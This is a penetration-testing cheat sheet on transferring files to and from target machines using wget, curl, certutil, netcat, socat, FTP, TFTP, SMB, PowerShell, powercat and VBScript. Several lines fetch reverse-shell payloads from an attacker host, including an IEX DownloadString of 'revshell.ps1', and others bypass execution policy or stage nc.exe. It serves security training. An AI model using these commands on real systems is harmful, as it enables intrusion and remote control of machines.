# File Transfer

## wget, curl, axel, certutil

Server

=== "python"

	``` bash
	python3 -m http.server 80
	```

	``` bash
	python -m SimpleHTTPServer 80
	```

=== "ruby"

	``` bash
	ruby -run -e httpd . -p 80
	```

=== "php"

	``` bash
	php -S 0.0.0.0:80
	```
	
=== "busybox"

	``` bash
	busybox httpd -f -p 80
	```

=== "apache2"

	``` bash
	sudo systemctl start apache2
	```

Client

=== "wget"

	``` bash
	wget -O /tmp/shell http://ip/shell.elf
	
	wget <uri> -P /path/to/
	```

=== "curl"

	``` bash
	curl -o /tmp/shell http://ip/shell.elf
	```

=== "axel"

	``` bash
	axel -a -n 20 -o /tmp/shell http://ip/shell.elf
	```

=== "certutil"

	``` bash
	certutil.exe -urlcache -f http://<url>/shell.exe C:\\inetpub\\wwwroot\\shell.exe
	```

## Socat

Kali machine

``` bash
sudo socat TCP4-LISTEN:443,fork file:shell.exe
```

Windows machine

``` bash
socat TCP4:ip:443 file:shell.exe,create
```

## Netcat

Kali machine

``` bash
nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe
```

Windows machine

``` bash
nc -nv ip 4444 > wget.exe
```

## SCP Command

[How to Use SCP Command to Securely Transfer Files](https://linuxize.com/post/how-to-use-scp-command-to-securely-transfer-files/)

``` bash
scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2
```

To copy a file from a local to a remote system run the following command:

``` bash
scp -P 2322 file.txt remote_username@10.10.0.2:/remote/directory/newfilename.txt
```

To copy a directory from a local to remote system, use the -r option:

``` bash
scp -r /local/directory remote_username@10.10.0.2:/remote/directory
```

``` bash
scp remote_username@10.10.0.2:/remote/file.txt /local/directory
```

## Upload files PHP Server

Kali Machine

``` php
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile= $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Client

PowerShell

``` bash
powershell.exe (New-Object System.Net.WebClient).UploadFile('http://ip/upload.php', 'test.txt')
```

curl

``` bash
curl -F "file=@nc.cmd" http://ip/upload.php
```

## FTP Services

### FTP Server

Install

``` bash
sudo apt-get install vsftpd
sudo service vsftpd start
```

Anonymous access `/etc/vsftpd.conf`

``` txt
anonymous_enable=YES
```

### Pure-FTPd

=== "Client"

	ftp.txt

	``` bash
	open ip 21
	USER hades
	passwd
	bin
	GET nc.exe
	quit
	```

	``` bash
	ftp -v -n -s:ftp.txt
	```

=== "setup-ftp.sh"

	``` bash
	groupadd ftpgroup
	useradd -g ftpgroup -d /dev/null -s /etc ftpuser
	pure-pw useradd hades -u ftpuser -d /ftphome
	pure-pw mkdb
	cd /etc/pure-ftpd/auth/
	ln -s ../conf/PureDB 60pdb
	mkdir -p /ftphome
	chown -R ftpuser:ftpgroup /ftphome/
	systemctl restart pure-ftpd
	```

### TFTP

Server

``` bash
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

Checking running service

``` bash
$ getent services tftp
tftp                  69/udp
```

Client

``` bash
tftp -i ip put test.txt
```

## Windows

### PowerShell

Kali machine

``` bash
sudo python3 -m http.server 80
```

Executing a remote PowerShell script

``` bash
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://ip/revshell.ps1')
```

Windows machine

``` bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://ip/wget.exe','C:\Users\Public\Desktop\wget.exe')"
```

=== "ps1 script"

	``` bash
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
	```

=== "wget.ps1.txt"

	``` bash
	echo $webclient = New-Object System.Net.WebClient >> wget.ps1
	echo $url = "http://ip/nc.exe" >> wget.ps1
	echo $file = "nc.exe" >> wget.ps1
	echo $webclient.DownloadFile($url,$file) >> wget.ps1
	```

### Powercat

=== "Bypass policy"

	``` powershell
	Set-ExecutionPolicy Unrestricted
	```

=== "Download and execute from internet"

	``` powershell
	iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
	```

=== "Local machine"

	``` powershell
	. .\powercat.ps1
	```

Kali machine

``` bash
sudo nc -lnvp 443 > powercat.ps1
```

Windows machine

``` bash
powercat -c ip -p 443 -i C:\Users\Public\powercat.ps1
```

### [VBScript](http://www.ericphelps.com/scripting/samples)

=== "command"

	Paste and execute `wget.vbs` script to the Windows machine.

	``` bash
	cscript wget.vbs http://<url>/shell.exe shell.exe
	```

=== "wget.vbs.txt"

	``` bash
	echo strUrl = WScript.Arguments.Item(0) > wget.vbs
	echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
	echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
	echo Err.Clear >> wget.vbs
	echo Set http = Nothing >> wget.vbs
	echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
	echo http.Open "GET", strURL, False >> wget.vbs
	echo http.Send >> wget.vbs
	echo varByteArray = http.ResponseBody >> wget.vbs
	echo Set http = Nothing >> wget.vbs
	echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
	echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
	echo strData = "" >> wget.vbs
	echo strBuffer = "" >> wget.vbs
	echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
	echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
	echo Next >> wget.vbs
	echo ts.Close >> wget.vbs
	```

### Hex String

Smaller file

``` bash
upx -9 nc.exe
```

``` bash
exe2hex -x nc.exe -p nc.cmd
```

### SMB Protocol

Install

``` bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
sudo pip install -r requirements.txt
sudo python3 setup.py install
```

SMB Server

``` bash
$ locate whoami.exe
/usr/share/windows-resources/binaries/whoami.exe
```

``` bash
smbserver.py a /usr/share/windows-binaries/
```

SMB Client

``` bash
\\<ip_server>\a\whoami.exe
```